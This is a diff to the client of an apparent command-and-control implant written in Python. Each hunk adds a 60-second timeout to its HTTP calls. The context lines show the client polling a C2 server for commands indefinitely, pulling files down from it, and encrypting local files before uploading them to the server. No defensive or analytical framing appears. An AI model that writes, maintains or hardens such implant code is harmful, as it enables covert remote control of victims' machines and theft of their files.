@@ -45,7 +45,7 @@ def post_to_server(message: str, response_path=RESPONSE):
         # Post encoded encrypted message to Server via response_path address
         post(f"http://{C2_SERVER}:{PORT}{response_path}",
              data={RESPONSE_KEY: message},
-             headers=HEADERS, proxies=PROXY)
+             headers=HEADERS, proxies=PROXY, timeout=60)
 
     except exceptions.RequestException:
         return
@@ -93,7 +93,7 @@ if __name__ == "__main__":
         '''Try an http get requests to the C2 Server and retrieve command;
         if failed, Keep Trying forever.'''
         try:
-            response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
+            response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY, timeout=60)
             # test print
             print(client.split("@")[0], "=>", response.status_code, sep=" ")
             # if we got 404 status codes, raise an exception to jump to except block
@@ -200,7 +200,7 @@ if __name__ == "__main__":
             # Use and HTTP GET request to stream the requested file from c2 server
             try:
                 with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
-                         headers=HEADERS, proxies=PROXY) as response:
+                         headers=HEADERS, proxies=PROXY, timeout=60) as response:
 
                     # If the file was not found, open it up and write it out to disk, then notify us on the server
                     if response.status_code == 200:
@@ -244,7 +244,7 @@ if __name__ == "__main__":
                 with open(filepath, "rb") as fileHandle:
                     encryptedFile = cipher.encrypt(fileHandle.read())
                     put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encryptedFilename}", data=encryptedFile, stream=True,
-                        headers=HEADERS, proxies=PROXY)
+                        headers=HEADERS, proxies=PROXY, timeout=60)
 
                 # Notify us on the server that the file was downloaded
                 post_to_server(f"[+] Client: {filename} is now Uploaded to {INCOMING}/{filename} on the {client}.\n")
